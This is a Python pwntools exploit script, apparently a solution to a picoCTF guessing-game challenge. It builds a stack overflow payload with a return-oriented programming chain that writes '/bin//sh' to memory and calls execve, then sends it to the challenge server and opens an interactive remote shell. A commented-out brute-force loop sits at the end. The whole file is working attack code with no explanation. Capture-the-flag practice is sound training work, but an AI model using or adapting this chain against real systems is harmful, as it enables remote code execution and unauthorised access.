from pwn import *

# Padding goes here
p = b'A'*120

p += p64(0x0000000000410ca3) # pop rsi ; ret
p += p64(0x00000000006ba0e0) # @ .data
p += p64(0x00000000004163f4) # pop rax ; ret
p += b'/bin//sh'
p += p64(0x000000000047ff91) # mov qword ptr [rsi], rax ; ret
p += p64(0x0000000000410ca3) # pop rsi ; ret
p += p64(0x00000000006ba0e8) # @ .data + 8
p += p64(0x0000000000445950) # xor rax, rax ; ret
p += p64(0x000000000047ff91) # mov qword ptr [rsi], rax ; ret
p += p64(0x0000000000400b73) # get_random
p += p64(0xFFFFFFFFFFFFFFFF) # junk
p += p64(0x0000000000400696) # pop rdi ; ret
p += p64(0x00000000006ba0e0) # @ .data
p += p64(0x0000000000410ca3) # pop rsi ; ret
p += p64(0x00000000006ba0e8) # @ .data + 8
p += p64(0x000000000044a6b5) # pop rdx ; ret
p += p64(0x00000000006ba0e8) # @ .data + 8
p += p64(0x000000000040137c) # syscall

r = remote('jupiter.challenges.picoctf.org', 42953)
r.recvlines(2)
for i in range(12):
    r.recvline()
    r.sendlines("1")
    r.recvlines(2)

r.recvline()
r.sendline("91")
r.recvuntil("? ")
r.sendline(p)
r.interactive()



"""
for x in range(100):
    print(x)
    r.sendline(str(x))
    #time.sleep(1)
    print(r.recvline_endswith("?"))
    if len(r.recvline_startswith("Congrats", timeout =0.10).decode('UTF-8')) > 0:
        r.interactive()
ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOP
"""